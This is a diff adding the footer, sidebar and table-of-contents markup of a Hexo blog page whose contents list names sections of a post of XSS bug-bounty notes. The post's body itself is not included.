+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:12345@qq.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/h0e4a0r1t" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/example_qr.jpg">
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Notes"><span class="toc-number">1.</span> <span class="toc-text">XSS_Notes</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#主要挖掘方法：Burpsuite-and-WFuzz"><span class="toc-number">1.0.1.</span> <span class="toc-text">主要挖掘方法：Burpsuite and WFuzz</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-新思路"><span class="toc-number">1.1.</span> <span class="toc-text">0x00.新思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#文件上传："><span class="toc-number">1.1.1.</span> <span class="toc-text">文件上传：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#更多bypass变形-》-《XSS-Cheat-Sheet-2019-Edition-2》"><span class="toc-number">1.1.2.</span> <span class="toc-text">更多bypass变形 =》 《XSS-Cheat-Sheet-2019-Edition-2》</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-案例分析"><span class="toc-number">1.2.</span> <span class="toc-text">0x01.案例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-BugBounty-Sleeping-stored-Google-XSS-Awakens-a-5000-Bounty-by-Patrik-Fehrenbach"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.[BugBounty] Sleeping stored Google XSS Awakens a $5000 Bounty  by Patrik Fehrenbach</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Uber-Bug-Bounty-Turning-Self-XSS-into-Good-XSS"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.Uber Bug Bounty: Turning Self-XSS into Good-XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Three-Stored-XSS-in-Facebook"><span class="toc-number">1.2.3.</span> <span class="toc-text">3.Three Stored XSS in Facebook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Persistent-XSS-on-myworld-ebay-com"><span class="toc-number">1.2.4.</span> <span class="toc-text">4. Persistent XSS on myworld.ebay.com</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Complicated-Best-Report-of-Google-XSS"><span class="toc-number">1.2.5.</span> <span class="toc-text">5. Complicated, Best Report of Google XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-Tricky-Html-Injection-and-Possible-XSS-in-sms-be-vip-twitter-com"><span class="toc-number">1.2.6.</span> <span class="toc-text">6. Tricky Html Injection and Possible XSS in sms-be-vip.twitter.com</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-Yahoo-Mail-stored-XSS"><span class="toc-number">1.2.7.</span> <span class="toc-text">7. Yahoo Mail stored XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Bypass"><span class="toc-number">1.3.</span> <span class="toc-text">0x02.Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-骚思路"><span class="toc-number">1.4.</span> <span class="toc-text">0x03.骚思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-在输入限制中的xss"><span class="toc-number">1.4.1.</span> <span class="toc-text">1.在输入限制中的xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-使用XSS控制浏览器"><span class="toc-number">1.4.2.</span> <span class="toc-text">2.使用XSS控制浏览器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-CSS版XSS"><span class="toc-number">1.4.3.</span> <span class="toc-text">3.CSS版XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-jQuary"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">4. jQuary</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-设置定时"><span class="toc-number">1.4.4.</span> <span class="toc-text">5. 设置定时</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 5
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href="/2019/04/22/XSS_Note_1/">XSS_Notes_1</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href="/2019/04/22/Recon新思路/">Recon 新思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href="/2019/04/22/ssrf/">SSRF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href="/2019/04/22/Recon/">Recon</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/17</span><a class="archive-post-title" href="/2019/03/17/hello/">Hello</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "H1e4a0r1t"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
